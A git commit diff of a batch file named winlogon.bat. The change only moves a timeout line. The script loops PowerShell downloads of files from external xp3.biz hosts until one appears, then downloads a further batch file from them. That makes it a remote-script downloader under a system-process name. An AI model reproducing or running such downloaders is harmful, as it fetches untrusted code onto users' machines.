0b0c0b4bf162d3a3d2267ddd56c7a35f88f94c4c
theredenemy <34151821+theredenemy@users.noreply.github.com>
2022-02-04 20:26:19 -0800

    Update winlogon.bat
    fix timeout

--- windows1093/winlogon.bat
+++ windows1093/winlogon.bat
@@ -1,9 +1,9 @@
 @echo off
 :xbat
+timeout /t 3
 powershell -Command "(New-Object Net.WebClient).DownloadFile('http://dos.xp3.biz/xbat/on.xbat', 'on.xbat')"
 powershell -Command "Invoke-WebRequest http://bat1234.xp3.biz/xbat/on.xbat -OutFile on.xbat"
 if exist on.xbat goto xbat.download
-timeout /t 3
 goto xbat
 :xbat.download
 powershell -Command "(New-Object Net.WebClient).DownloadFile('http://dos.xp3.biz/xbat/bat.xbat', 'bat.bat')"
